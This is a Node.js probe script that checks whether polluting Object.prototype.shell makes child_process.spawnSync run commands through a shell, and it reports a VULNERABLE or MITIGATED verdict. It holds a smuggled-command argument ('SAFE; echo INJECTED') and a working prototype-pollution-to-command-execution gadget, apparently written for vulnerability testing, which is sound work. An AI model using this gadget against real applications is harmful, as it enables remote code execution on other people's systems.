'use strict';

const { spawnSync } = require('child_process');

const DIVIDER = '='.repeat(60);
const SEPARATOR = '-'.repeat(60);
const ARGUMENTS = ['SAFE; echo INJECTED'];

const executeProbe = () => {
  const result = spawnSync('echo', ARGUMENTS);
  const output = String(result.stdout || '').trim();

  return {
    out: output,
    fired: output.split('\n').length > 1,
  };
};

const displayProbe = (title, result) => {
  console.log(title);
  console.log('    echo argv output :', JSON.stringify(result.out));
  console.log('    shell fired (RCE)?:', result.fired);
};

console.log(DIVIDER);
console.log('Silent Spring — universal gadget probe');
console.log('Node runtime :', process.version);
console.log(DIVIDER);

const results = {};

results.before = executeProbe();

console.log();
displayProbe('[1] Baseline (no pollution)', results.before);

Object.prototype.shell = true;

console.log();
console.log('[2] Polluted Object.prototype.shell = true');
console.log('    {}.shell now      :', {}.shell);

results.after = executeProbe();

console.log('    echo argv output :', JSON.stringify(results.after.out));
console.log('    shell fired (RCE)?:', results.after.fired);

results.verdict = results.after.fired ? 'VULNERABLE' : 'MITIGATED';

console.log();
console.log(SEPARATOR);
console.log(`VERDICT for Node ${process.version}: ${results.verdict}`);
console.log(SEPARATOR);

console.log(
  'RESULT_JSON ' +
    JSON.stringify({
      node: process.version,
      baselineFired: results.before.fired,
      pollutedFired: results.after.fired,
      verdict: results.verdict,
    })
);

process.exit(results.after.fired ? 0 : 0);
